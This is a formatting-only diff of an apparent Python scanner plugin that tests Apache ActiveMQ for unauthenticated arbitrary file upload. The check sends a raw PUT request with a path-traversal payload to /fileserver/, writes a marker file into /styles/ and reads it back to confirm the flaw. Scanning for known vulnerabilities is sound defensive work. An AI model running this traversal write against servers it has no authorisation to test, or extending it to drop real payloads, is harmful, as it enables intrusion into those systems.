@@ -4,6 +4,7 @@ import time
 import urllib2
 import random
 
+
 def get_plugin_info():
     plugin_info = {
         "name": "ActiveMQ unauthenticated RCE",
@@ -17,11 +18,13 @@ def get_plugin_info():
     }
     return plugin_info
 
+
 def random_str(len):
     str1 = ""
     for i in range(len):
         str1 += (random.choice("ABCDEFGH1234567890"))
     return str1
+
 
 def check(ip, port, timeout):
     try:
@@ -29,12 +32,13 @@ def check(ip, port, timeout):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
         filename = random_str(6)
-        flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n"%(filename)
+        flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (
+            filename)
         s.send(flag)
         time.sleep(1)
         s.recv(1024)
         s.close()
-        url = 'http://' + ip + ":" + str(port) + '/styles/%s.txt'%(filename)
+        url = 'http://' + ip + ":" + str(port) + '/styles/%s.txt' % (filename)
         res_html = urllib2.urlopen(url, timeout=timeout).read(1024)
         if 'xxscan0' in res_html:
             return u"存在任意文件上传漏洞，" + url
